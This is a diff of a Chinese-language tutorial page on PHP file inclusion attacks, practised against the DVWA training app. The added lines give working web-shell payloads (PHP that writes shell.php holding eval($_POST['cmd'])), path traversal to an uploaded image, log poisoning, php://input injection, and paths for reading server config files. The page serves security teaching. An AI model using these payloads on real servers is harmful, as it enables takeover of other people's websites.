@@ -118,6 +118,8 @@
                 
                 
 
+<p>环境：phpStudy 2016、DVWA v1.10</p>
+
 <h3 id="0x00-文件包含">0x00 文件包含</h3>
 
 <p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。</p>
@@ -184,23 +186,7 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 <h3 id="0x06-本地包含getshell">0x06 本地包含GetShell</h3>
 
 <ul>
-<li>示例一</li>
-</ul>
-
-<pre><code class="language-php">&lt;?php
-    if (@$_GET['page']) {  
-        include($_GET['page']);
-    } else {  
-        include &quot;show.php&quot;;
-    }
-?&gt;
-</code></pre>
-
-<p><img src="/img/post/file_include_upload1.png" alt="文件包含-上传图片马" />
-<img src="/img/post/file_include_upload1_check.png" alt="文件包含-验证能包含图片马" /></p>
-
-<ul>
-<li>示例二</li>
+<li>简单代码示例</li>
 </ul>
 
 <pre><code class="language-php">&lt;?php
@@ -216,46 +202,25 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 <img src="/img/post/file_include_upload2_check.png" alt="文件包含-验证能包含图片马" /></p>
 
 <ul>
-<li>%00截断包含(PHP&lt;5.3.4 and magic_quotes_gpc=off)</li>
-</ul>
-
-<pre><code class="language-php">&lt;?php
-    if (@$_GET['page']) {
-        include &quot;./action/&quot;.$_GET['page'].&quot;.php&quot;;
-        echo &quot;./action/&quot;.$_GET['page'].&quot;.php&quot;;
-    } else {
-        include &quot;./action/show.php&quot;;
-    }
-?&gt;
-</code></pre>
-
-<p><img src="/img/post/file_include_upload3.png" alt="文件包含-上传图片马" />
-<img src="/img/post/file_include_upload3_check.png" alt="文件包含-验证能包含图片马" />
-还有一个路径长度截断，Linux可以用./或/截断，需要文件名长度大于4096，Windows可以<br />
-用\.或./或\或/截断，需要大于256，是否能成功截断有多方面原因，可以说是靠运气的</p>
+<li><p>包含图片马写shell</p>
 
 <ul>
-<li>包含图片马写shell</li>
+<li>生成包含<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST['cmd']);?&gt;&quot;)?&gt;</code>的图片马</li>
+<li>上传后图片路径为../../hackable/uploads/aa.png</li>
+<li>访问<code>http://10.11.11.20/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/aa.png</code></li>
+<li>在fi这个文件夹下会看到生成shell.php,内容为<code>&lt;?php eval($_POST['cmd']);?&gt;</code></li>
+</ul></li>
+
+<li><p>包含日志GetShell(主要是得到日志的路径)</p></li>
 </ul>
 
-<pre><code>上传图片马，马包含的代码为&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[xxser]);?&gt;&quot;)?&gt;，
-上传后图片路径为/uploadfile/201643.jpg，当访问
-http://localhost/dvwa/vulnerabilities/fi/?page=../../uploadfile/201643.jpg时，
-将会在fi这个文件夹下生成shell.php,内容为&lt;?php eval($_POST[xxser]);?&gt;
-</code></pre>
-
-<ul>
-<li>包含日志GetShell(主要是得到日志的路径)</li>
-</ul>
-
-<pre><code>读日志路径：
+<pre><code class="language-ini">在Linux下一般读日志路径：
 文件包含漏洞读取apache配置文件
 index.php?page=/etc/init.d/httpd
 index.php?page=/etc/httpd/conf/httpd.conf
 默认位置/var/log/httpd/access_log
 </code></pre>
 
-<blockquote>
 <p>日志会记录客户端请求及服务器响应的信息，访问<code>http://www.xx.com/&lt;?php phpinfo(); ?&gt;</code>时，&lt;?php phpinfo(); ?&gt;也会被记录在日志里，也可以插入到User-Agent
 <img src="/img/post/file_include_access.log1.png" alt="文件包含-包含日志" />
 可以通过Burp Suite来绕过编码
@@ -265,24 +230,24 @@ index.php?page=/etc/httpd/conf/httpd.conf
 <img src="/img/post/file_include_access.log4.png" alt="文件包含-包含日志" /></p>
 
 <ul>
-<li>包含环境变量文件GetShell</li>
-</ul>
-
-<pre><code>需要PHP运行在CGI模式
-然后和包含日志一样，在User-Agent修改为payload
-</code></pre>
-
-<ul>
 <li>使用PHP封装协议GetShell</li>
 </ul>
 
-<pre><code>allow_url_include=On时,若执行http://www.xxx.com/index.php?page=php://input,并且提
-交数据&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST['xxxser']);?&gt;&quot;) ?&gt;
+<pre><code>allow_url_include=On时：
+
+http://www.xxx.com/index.php?page=php://input
+POST:&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST['cmd']);?&gt;&quot;) ?&gt;
+
 结果将在index.php所在文件下生成一句话文件shell.php
 </code></pre>
 
-<p><img src="/img/post/file_include_enprotocol1.png" alt="文件包含-用PHP封装协议写shell1" />
-<img src="/img/post/file_include_enprotocol2.png" alt="文件包含-用PHP封装协议写shell2" /></p>
+<ul>
+<li>%00截断包含(PHP&lt;5.3.4 and magic_quotes_gpc=Off，CVE-2006-7243)</li>
+</ul>
+
+<p><img src="/img/post/file_include_upload3.png" alt="文件包含-上传图片马" /></p>
+
+<p>还有一个路径长度截断，可以用.或/.或./截断，Windows需要259个bytes，Linux需要4096个bytes</p>
 
 <ul>
 <li>phpinfo包含临时文件GetShell</li>
@@ -290,6 +255,14 @@ index.php?page=/etc/httpd/conf/httpd.conf
 
 <pre><code>向phpinfo上传文件则可以返回文件路径，但是文件存在时间很短，
 可以用程序持续上传，然后就可以包含你上传的文件了
+</code></pre>
+
+<ul>
+<li>包含环境变量文件GetShell</li>
+</ul>
+
+<pre><code>需要PHP运行在CGI模式
+然后和包含日志一样，在User-Agent修改为payload
 </code></pre>
 
 <h3 id="0x07-本地包含读文件">0x07 本地包含读文件</h3>
@@ -340,7 +313,7 @@ Linux：
 
 <p>注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的
 <img src="/img/post/file_include_remote_include.png" alt="文件包含-远程包含" />
-若在a.txt写入<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[xxx]); ?&gt;&quot;) ?&gt;</code>，可直接写shell</p>
+若在a.txt写入<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST['cmd']); ?&gt;&quot;) ?&gt;</code>，可直接写shell</p>
 
 <h3 id="0x09-漏洞防御">0x09 漏洞防御</h3>
 
@@ -348,7 +321,6 @@ Linux：
 过滤./\
 禁止服务器远程文件包含
 </code></pre>
-</blockquote>
 
                 
                 <div style="padding:10px 1px;">
